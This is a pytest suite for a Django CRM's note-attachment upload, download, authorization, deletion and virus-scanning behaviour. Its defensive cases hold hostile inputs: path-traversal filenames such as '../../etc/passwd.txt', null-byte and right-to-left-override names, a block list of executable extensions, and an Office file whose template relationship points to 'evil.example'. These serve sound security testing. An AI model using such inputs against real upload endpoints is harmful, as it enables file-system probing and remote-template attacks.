"""Note attachments (docs/activities.md#attachments): what is accepted, where it goes, who
may reach it, and what happens when storage or the scanner fails."""

from __future__ import annotations

import hashlib
import io
import socket
import struct
import threading
import zipfile
from datetime import timedelta
from urllib.parse import quote

import pytest
from django.core.files.storage import storages
from django.utils import timezone

from arkray.activities import attachments, storage
from arkray.activities.models import Attachment
from arkray.audit.models import AuditEvent
from arkray.core.access import AccessScope
from arkray.leads import services as lead_services
from tests.factories import LeadFactory, NoteFactory, OpportunityFactory
from tests.helpers import drain_outbox, signed_in

pytestmark = pytest.mark.django_db

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\rIHDR" + b"\x01" * 64
JPEG = b"\xff\xd8\xff\xe0" + b"\x10" * 64
WEBP = b"RIFF\x24\x00\x00\x00WEBPVP8 " + b"\x00" * 40
PDF = b"%PDF-1.7\n1 0 obj\n<< >>\nendobj\ntrailer\n%%EOF\n"


def ooxml(*parts: str) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as package:
        for part in parts:
            package.writestr(part, "<x/>")
    return out.getvalue()


DOCX = ooxml("[Content_Types].xml", "word/document.xml")
XLSX = ooxml("[Content_Types].xml", "xl/workbook.xml")


def upload(client, note, name, content, workspace="me"):
    return client.post(
        f"/api/v1/workspaces/{workspace}/activities/{note.pk}/attachments",
        content,
        content_type="application/octet-stream",
        HTTP_X_FILENAME=quote(name, safe=""),
    )


def download(client, attachment_id, workspace="me", kind="download"):
    return client.get(f"/api/v1/workspaces/{workspace}/attachments/{attachment_id}/{kind}")


def body(response) -> bytes:
    return b"".join(response.streaming_content)


@pytest.fixture
def note(user_a):
    lead = LeadFactory(owner=user_a)
    return NoteFactory(lead=lead, opportunity=OpportunityFactory(lead=lead), created_by=user_a)


class TestUpload:
    @pytest.mark.parametrize(
        ("name", "content", "content_type"),
        [
            ("photo.png", PNG, "image/png"),
            ("scan.JPG", JPEG, "image/jpeg"),
            ("pic.webp", WEBP, "image/webp"),
            ("quote.pdf", PDF, "application/pdf"),
            (
                "proposal.docx",
                DOCX,
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            ),
            (
                "prices.xlsx",
                XLSX,
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            ),
            ("list.csv", b"name,tests\nCity Lab,300\n", "text/csv"),
            ("notes.txt", "Namaste नमस्ते".encode(), "text/plain"),
        ],
    )
    def test_allowed_types_are_stored_privately_under_a_generated_key(
        self, user_a, user_a_client, note, name, content, content_type
    ):
        response = upload(user_a_client, note, name, content)
        assert response.status_code == 201, response.content
        data = response.json()
        assert (data["name"], data["content_type"], data["size"]) == (
            name,
            content_type,
            len(content),
        )
        assert "storage_key" not in data
        row = Attachment.objects.get(pk=data["id"])
        assert name not in row.storage_key
        assert "/" in row.storage_key
        assert row.sha256 == hashlib.sha256(content).hexdigest()
        assert row.state == "stored"
        assert row.scan_status == "not_scanned"
        with storages["attachments"].open(row.storage_key, "rb") as stored:
            assert stored.read() == content
        event = AuditEvent.objects.get(action="attachment.uploaded")
        assert name not in str(event.metadata)  # the name is personal text: never audited

    def test_the_download_is_the_file_with_safe_headers(self, user_a_client, note):
        attachment_id = upload(user_a_client, note, "quote.pdf", PDF).json()["id"]
        response = download(user_a_client, attachment_id)
        assert response.status_code == 200
        assert body(response) == PDF
        assert response["Content-Type"] == "application/pdf"
        assert response["Content-Disposition"].startswith('attachment; filename="quote.pdf"')
        assert response["X-Content-Type-Options"] == "nosniff"
        assert "sandbox" in response["Content-Security-Policy"]
        assert "default-src 'none'" in response["Content-Security-Policy"]
        assert {"private", "no-store"} <= {
            part.strip() for part in response["Cache-Control"].split(",")
        }

    def test_only_images_preview_inline(self, user_a_client, note):
        image = upload(user_a_client, note, "photo.png", PNG).json()
        pdf = upload(user_a_client, note, "quote.pdf", PDF).json()
        assert (image["previewable"], pdf["previewable"]) == (True, False)
        preview = download(user_a_client, image["id"], kind="preview")
        assert preview.status_code == 200
        assert body(preview) == PNG
        assert preview["Content-Disposition"].startswith("inline;")
        assert preview["Content-Type"] == "image/png"
        assert download(user_a_client, pdf["id"], kind="preview").status_code == 422

    def test_a_non_ascii_name_is_kept_and_safely_encoded(self, user_a_client, note):
        name = 'प्रस्ताव "final"; v2.pdf'
        attachment_id = upload(user_a_client, note, name, PDF).json()["id"]
        disposition = download(user_a_client, attachment_id)["Content-Disposition"]
        assert "filename*=UTF-8''" + quote(name, safe="") in disposition
        assert '"final"' not in disposition.split(";")[1]  # the ASCII fallback is sanitised


class TestRefused:
    @pytest.mark.parametrize(
        "name",
        [
            "setup.exe",
            "lib.dll",
            "run.bat",
            "run.cmd",
            "script.ps1",
            "install.sh",
            "app.js",
            "page.html",
            "page.htm",
            "logo.svg",
            "archive.zip",
            "shell.php",
            "invoice.pdf.exe",
            "macro.docm",
            "noextension",
        ],
    )
    def test_dangerous_or_unknown_types(self, user_a_client, note, name):
        response = upload(user_a_client, note, name, PDF)
        assert response.status_code == 400
        assert "isn't allowed" in response.json()["error"]["details"]["file"][0]
        assert not Attachment.objects.exists()

    @pytest.mark.parametrize(
        ("name", "content"),
        [
            ("photo.png", PDF),  # a PDF called .png
            ("quote.pdf", b"<html><script>alert(1)</script></html>"),
            ("photo.jpg", PNG),
            ("proposal.docx", ooxml("[Content_Types].xml")),  # a zip, not a document
            (
                "proposal.docx",
                ooxml("[Content_Types].xml", "word/document.xml", "word/vbaProject.bin"),
            ),
            ("prices.xlsx", DOCX),
            ("notes.txt", b"MZ\x90\x00\x03\x00\x00\x00"),  # an executable called .txt
            ("notes.txt", b"\xff\xfe\xfa invalid utf-8"),
            ("list.csv", b"a,b\x00c"),
        ],
    )
    def test_content_must_be_what_the_name_says(self, user_a_client, note, name, content):
        response = upload(user_a_client, note, name, content)
        assert response.status_code == 400, response.content
        assert not Attachment.objects.exists()

    @pytest.mark.parametrize(
        ("raw", "stored"),
        [
            ("../../etc/passwd.txt", "passwd.txt"),
            ("..\\..\\windows\\win.ini.txt", "win.ini.txt"),
            ("/var/www/../notes.txt", "notes.txt"),
            ("  ..hidden.txt", "hidden.txt"),
            ("line\nbreak.txt", "line break.txt"),  # whitespace collapses, as in every name
        ],
    )
    def test_paths_are_never_trusted(self, user_a_client, note, raw, stored):
        response = upload(user_a_client, note, raw, b"hello")
        assert response.status_code == 201, response.content
        row = Attachment.objects.get(pk=response.json()["id"])
        assert row.original_name == stored
        assert ".." not in row.storage_key
        assert "passwd" not in row.storage_key

    @pytest.mark.parametrize(
        "name",
        [
            "a\x00b.txt",
            "a" + chr(0x202E) + "txt.exe",
            "x" * 201 + ".txt",
            "",
            ".txt",
        ],
    )
    def test_hostile_names(self, user_a_client, note, name):
        assert upload(user_a_client, note, name, b"hello").status_code == 400

    def test_empty_files(self, user_a_client, note):
        response = upload(user_a_client, note, "empty.txt", b"")
        assert response.status_code == 400
        assert "empty" in response.json()["error"]["details"]["file"][0]

    def test_oversized_files_are_refused_as_they_arrive(self, user_a_client, note, settings):
        settings.ATTACHMENT_MAX_BYTES = 1024
        response = upload(user_a_client, note, "big.txt", b"a" * 1025)
        assert response.status_code == 413
        assert response.json()["error"]["code"] == "file_too_large"
        assert upload(user_a_client, note, "fits.txt", b"a" * 1024).status_code == 201

    def test_the_declared_length_is_checked_before_reading(self, user_a_client, note, settings):
        settings.ATTACHMENT_MAX_BYTES = 1024
        response = user_a_client.post(
            f"/api/v1/workspaces/me/activities/{note.pk}/attachments",
            b"a" * 10,
            content_type="application/octet-stream",
            HTTP_X_FILENAME="small.txt",
            CONTENT_LENGTH="999999999",
        )
        assert response.status_code == 413

    def test_a_note_holds_a_bounded_number_of_files(self, user_a_client, note, settings):
        settings.ATTACHMENT_MAX_PER_NOTE = 2
        for n in range(2):
            assert upload(user_a_client, note, f"{n}.txt", b"x").status_code == 201
        assert upload(user_a_client, note, "3.txt", b"x").status_code == 422

    def test_only_notes_take_files(self, user_a, user_a_client):
        from tests.factories import TaskFactory

        task = TaskFactory(lead=LeadFactory(owner=user_a))
        assert upload(user_a_client, task, "x.txt", b"x").status_code == 404

    def test_an_archived_note_takes_none(self, user_a_client, note):
        note.archived_at = timezone.now()
        note.save(update_fields=["archived_at"])
        assert upload(user_a_client, note, "x.txt", b"x").status_code == 422


def package(parts: dict[str, str]) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as built:
        for name, text in parts.items():
            built.writestr(name, text)
    return out.getvalue()


TYPES = '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'
EXTERNAL_TEMPLATE = (
    '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
    'officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm"'
    ' TargetMode="External"/></Relationships>'
)


class TestOfficeActiveContent:
    """Enhancement security review: macros, OLE objects and ActiveX are refused however the
    parts are named; ordinary Office files (printer settings, embedded charts) still pass."""

    @pytest.mark.parametrize(
        ("name", "parts"),
        [
            ("ole.docx", {"word/embeddings/oleObject1.bin": "x"}),
            ("activex.docx", {"word/activeX/activeX1.xml": "<x/>"}),
            ("renamed-vba.docx", {"word/macros01.bin": "x"}),
            ("packaged-exe.docx", {"word/embeddings/setup.exe": "MZ"}),
            (
                "declared-vba.docx",
                {
                    "[Content_Types].xml": '<Types><Override PartName="/word/x.xml" ContentType='
                    '"application/vnd.ms-office.vbaProject"/></Types>'
                },
            ),
            ("remote-template.docx", {"word/_rels/settings.xml.rels": EXTERNAL_TEMPLATE}),
            ("macros.xlsx", {"xl/workbook.xml": "<x/>", "xl/vbaProject.bin": "x"}),
        ],
    )
    def test_refused(self, user_a_client, note, name, parts):
        main = "xl/workbook.xml" if name.endswith(".xlsx") else "word/document.xml"
        content = package({"[Content_Types].xml": TYPES, main: "<x/>", **parts})
        response = upload(user_a_client, note, name, content)
        assert response.status_code == 400, response.content
        assert not Attachment.objects.exists()

    @pytest.mark.parametrize(
        ("name", "parts"),
        [
            (
                "print.xlsx",
                {"xl/workbook.xml": "<x/>", "xl/printerSettings/printerSettings1.bin": "x"},
            ),
            ("chart.docx", {"word/document.xml": "<x/>", "word/embeddings/Sheet1.xlsx": "x"}),
            (
                "links.docx",
                {
                    "word/document.xml": "<x/>",
                    "word/_rels/document.xml.rels": '<Relationships><Relationship Id="r"'
                    ' Type="http://x/hyperlink" Target="https://arkray.example"'
                    ' TargetMode="External"/></Relationships>',
                },
            ),
        ],
    )
    def test_ordinary_documents_pass(self, user_a_client, note, name, parts):
        response = upload(
            user_a_client, note, name, package({"[Content_Types].xml": TYPES, **parts})
        )
        assert response.status_code == 201, response.content


class TestAuthorization:
    def test_another_user_can_neither_add_read_nor_delete(self, user_a_client, user_b, note):
        attachment_id = upload(user_a_client, note, "secret.pdf", PDF).json()["id"]
        priya = signed_in(user_b)
        assert upload(priya, note, "mine.txt", b"x").status_code == 404
        for kind in ("download", "preview"):
            assert download(priya, attachment_id, kind=kind).status_code == 404
        assert priya.delete(f"/api/v1/workspaces/me/attachments/{attachment_id}").status_code == 404
        assert Attachment.objects.get(pk=attachment_id).deleted_at is None

    def test_knowing_the_id_is_not_enough_in_another_workspace(
        self, admin_client, user_a_client, user_b, note
    ):
        attachment_id = upload(user_a_client, note, "secret.pdf", PDF).json()["id"]
        # the administrator, but through Priya's workspace: not found
        response = download(admin_client, attachment_id, workspace=str(user_b.pk))
        assert response.status_code == 404
        allowed = download(admin_client, attachment_id, workspace=str(note.owner_id))
        assert allowed.status_code == 200

    def test_an_administrator_works_with_files_in_a_users_workspace(
        self, admin, admin_client, user_a, note
    ):
        ws = str(user_a.pk)
        response = upload(admin_client, note, "from-admin.txt", b"hi", workspace=ws)
        assert response.status_code == 201, response.content
        event = AuditEvent.objects.get(action="attachment.uploaded")
        assert (event.actor_id, event.subject_user_id) == (admin.pk, user_a.pk)

    def test_only_the_author_or_an_administrator_changes_a_notes_files(
        self, admin, user_a, user_a_client
    ):
        lead = LeadFactory(owner=user_a)
        admins_note = NoteFactory(lead=lead, created_by=admin)
        assert upload(user_a_client, admins_note, "x.txt", b"x").status_code == 403

    def test_the_download_rechecks_on_every_request(
        self, admin, user_a, user_a_client, user_b, note
    ):
        attachment_id = upload(user_a_client, note, "x.txt", b"x").json()["id"]
        assert download(user_a_client, attachment_id).status_code == 200
        lead = note.lead
        lead.refresh_from_db()
        lead_services.reassign_lead(
            actor=admin,
            scope=AccessScope.organization(admin.pk),
            lead_id=lead.pk,
            version=lead.version,
            owner_id=user_b.pk,
        )
        # The note followed its lead to Priya: Rahul's old link now finds nothing.
        assert download(user_a_client, attachment_id).status_code == 404
        assert download(signed_in(user_b), attachment_id).status_code == 200


class TestDeleting:
    def test_hidden_at_once_and_the_object_removed_by_a_job(self, user_a_client, note):
        attachment_id = upload(user_a_client, note, "x.txt", b"x").json()["id"]
        key = Attachment.objects.get(pk=attachment_id).storage_key
        url = f"/api/v1/workspaces/me/attachments/{attachment_id}"
        assert user_a_client.delete(url).status_code == 204
        assert user_a_client.delete(url).status_code == 204  # a retry
        assert download(user_a_client, attachment_id).status_code == 404
        assert storages["attachments"].exists(key)
        drain_outbox()
        assert not storages["attachments"].exists(key)
        row = Attachment.objects.get(pk=attachment_id)
        assert row.purged_at is not None
        assert AuditEvent.objects.filter(action="attachment.deleted").count() == 1

    def test_housekeeping_resolves_abandoned_uploads_idempotently(self, user_a, note):
        row = Attachment.objects.create(
            note=note,
            original_name="half.txt",
            extension="txt",
            content_type="text/plain",
            size=1,
            sha256="0" * 64,
            storage_key="2026/10/abandoned",
            uploaded_by=user_a,
            created_at=timezone.now() - timedelta(hours=2),
        )
        storages["attachments"].save(row.storage_key, io.BytesIO(b"x"))
        first = attachments.housekeeping(timezone.now())
        assert (first["abandoned"], first["purged"]) == (1, 1)
        assert not storages["attachments"].exists(row.storage_key)
        second = attachments.housekeeping(timezone.now())
        assert (second["abandoned"], second["purged"]) == (0, 0)


class TestReviewRegressions:
    """Enhancement review findings, each pinned."""

    def test_an_archived_or_erased_leads_notes_take_no_new_files_or_text(
        self, user_a, user_a_client, note
    ):
        """P2: files and edited text could be added to an erased lead's notes, beyond the
        reach of any later erasure."""
        lead_services.archive_lead(
            actor=user_a, scope=AccessScope.own(user_a.pk), lead_id=note.lead_id, version=1
        )
        response = upload(user_a_client, note, "x.txt", b"x")
        assert response.status_code == 422
        assert "archived" in response.json()["error"]["message"]
        note.refresh_from_db()
        edit = user_a_client.patch(
            f"/api/v1/workspaces/me/activities/{note.pk}",
            {"version": note.version, "description": "new words"},
            format="json",
        )
        assert edit.status_code == 422
        assert not Attachment.objects.exists()

    def test_configuring_a_scanner_later_scans_the_earlier_files(
        self, user_a_client, note, settings, clamd
    ):
        """P2: files stored without a scanner became undownloadable for good once one was
        configured (nothing ever scanned them)."""
        scanner = settings.ATTACHMENT_SCANNER
        settings.ATTACHMENT_SCANNER = ""
        created = upload(user_a_client, note, "x.txt", b"fine").json()
        assert created["scan_status"] == "not_scanned"
        settings.ATTACHMENT_SCANNER = scanner
        assert attachments.housekeeping(timezone.now())["queued_for_scanning"] == 1
        drain_outbox()
        assert Attachment.objects.get(pk=created["id"]).scan_status == "clean"
        assert download(user_a_client, created["id"]).status_code == 200
        assert attachments.housekeeping(timezone.now())["queued_for_scanning"] == 0

    def test_removing_the_scanner_releases_files_waiting_for_a_scan(
        self, user_a_client, note, settings
    ):
        settings.ATTACHMENT_SCANNER = "clamd://127.0.0.1:1"  # nothing listens
        created = upload(user_a_client, note, "x.txt", b"fine").json()
        assert created["scan_status"] == "pending"
        settings.ATTACHMENT_SCANNER = ""
        assert attachments.housekeeping(timezone.now())["no_longer_scanned"] == 1
        assert download(user_a_client, created["id"]).status_code == 200


def test_a_size_limit_beyond_what_the_database_stores_is_a_startup_error(settings):
    settings.ATTACHMENT_MAX_BYTES = 200 * 1024 * 1024
    assert [e.id for e in storage.check_allowed_extensions()] == ["arkray.E022"]


class TestOutages:
    def test_storage_down_fails_the_upload_cleanly_and_nothing_else(
        self, user_a_client, note, monkeypatch
    ):
        def down(*args, **kwargs):
            raise storage.StorageUnavailable

        monkeypatch.setattr(storage, "save", down)
        response = upload(user_a_client, note, "x.txt", b"x")
        assert response.status_code == 503
        assert response.json()["error"]["code"] == "storage_unavailable"
        assert Attachment.objects.get().state == "failed"
        # the rest of the CRM doesn't depend on file storage
        assert user_a_client.get("/api/v1/workspaces/me/dashboard").status_code == 200
        notes = user_a_client.get(
            f"/api/v1/workspaces/me/opportunities/{note.opportunity_id}/notes"
        )
        assert notes.status_code == 200
        assert notes.json()["results"][0]["attachments"] == []

    def test_storage_down_fails_the_download_with_a_503(self, user_a_client, note, monkeypatch):
        attachment_id = upload(user_a_client, note, "x.txt", b"x").json()["id"]

        def down(*args, **kwargs):
            raise storage.StorageUnavailable

        monkeypatch.setattr(storage, "open_file", down)
        assert download(user_a_client, attachment_id).status_code == 503


class FakeClamd:
    """A minimal clamd INSTREAM peer for tests (the protocol, not a scanner): answers FOUND
    for content containing the EICAR marker, OK otherwise."""

    def __init__(self) -> None:
        self.server = socket.create_server(("127.0.0.1", 0))
        self.port = self.server.getsockname()[1]
        self.thread = threading.Thread(target=self.serve, daemon=True)
        self.thread.start()

    def serve(self) -> None:
        while True:
            try:
                conn, _ = self.server.accept()
            except OSError:
                return
            with conn:
                command = b""
                while not command.endswith(b"\0"):
                    command += conn.recv(1)
                data = b""
                while True:
                    (size,) = struct.unpack("!L", self._exactly(conn, 4))
                    if size == 0:
                        break
                    data += self._exactly(conn, size)
                verdict = (
                    b"stream: Eicar-Test-Signature FOUND\0" if b"EICAR" in data else b"stream: OK\0"
                )
                conn.sendall(verdict)

    @staticmethod
    def _exactly(conn, size):
        out = b""
        while len(out) < size:
            out += conn.recv(size - len(out))
        return out

    def close(self) -> None:
        self.server.close()


@pytest.fixture
def clamd(settings):
    fake = FakeClamd()
    settings.ATTACHMENT_SCANNER = f"clamd://127.0.0.1:{fake.port}"
    yield fake
    fake.close()


class TestScanning:
    def test_pending_until_clean(self, user_a_client, note, clamd):
        created = upload(user_a_client, note, "x.txt", b"fine").json()
        assert (created["scan_status"], created["downloadable"]) == ("pending", False)
        assert download(user_a_client, created["id"]).status_code == 422
        drain_outbox()
        assert Attachment.objects.get(pk=created["id"]).scan_status == "clean"
        assert download(user_a_client, created["id"]).status_code == 200

    def test_malware_is_blocked_and_removed(self, user_a_client, note, clamd):
        created = upload(user_a_client, note, "x.txt", b"EICAR test").json()
        key = Attachment.objects.get(pk=created["id"]).storage_key
        drain_outbox()
        row = Attachment.objects.get(pk=created["id"])
        assert row.scan_status == "rejected"
        response = download(user_a_client, created["id"])
        assert response.status_code == 422
        assert "blocked" in response.json()["error"]["message"]
        assert not storages["attachments"].exists(key)
        assert AuditEvent.objects.filter(action="attachment.rejected").count() == 1

    def test_a_scanner_outage_keeps_the_file_pending(self, user_a_client, note, settings):
        settings.ATTACHMENT_SCANNER = "clamd://127.0.0.1:1"  # nothing listens
        created = upload(user_a_client, note, "x.txt", b"fine").json()
        drain_outbox()
        assert Attachment.objects.get(pk=created["id"]).scan_status == "pending"
        assert download(user_a_client, created["id"]).status_code == 422


class TestNotesList:
    def test_notes_with_files_authors_and_edits(
        self, admin, admin_client, user_a, user_a_client, note
    ):
        upload(user_a_client, note, "photo.png", PNG)
        url = f"/api/v1/workspaces/me/opportunities/{note.opportunity_id}/notes"
        listed = user_a_client.get(url).json()["results"]
        assert len(listed) == 1
        first = listed[0]
        assert first["created_by"]["id"] == str(user_a.pk)
        assert first["can_edit"] is True
        assert first["edited_at"] is None
        assert [a["name"] for a in first["attachments"]] == ["photo.png"]
        # an administrator edits it in Rahul's workspace: shown as their edit
        edited = admin_client.patch(
            f"/api/v1/workspaces/{user_a.pk}/activities/{note.pk}",
            {"version": note.version, "description": "Corrected by admin"},
            format="json",
        )
        assert edited.status_code == 200, edited.content
        again = user_a_client.get(url).json()["results"][0]
        assert again["description"] == "Corrected by admin"
        assert again["edited_by"]["id"] == str(admin.pk)
        assert again["created_by"]["id"] == str(user_a.pk)  # the author stays the author

    def test_another_users_deal_notes_dont_exist(self, user_b, note):
        url = f"/api/v1/workspaces/me/opportunities/{note.opportunity_id}/notes"
        assert signed_in(user_b).get(url).status_code == 404
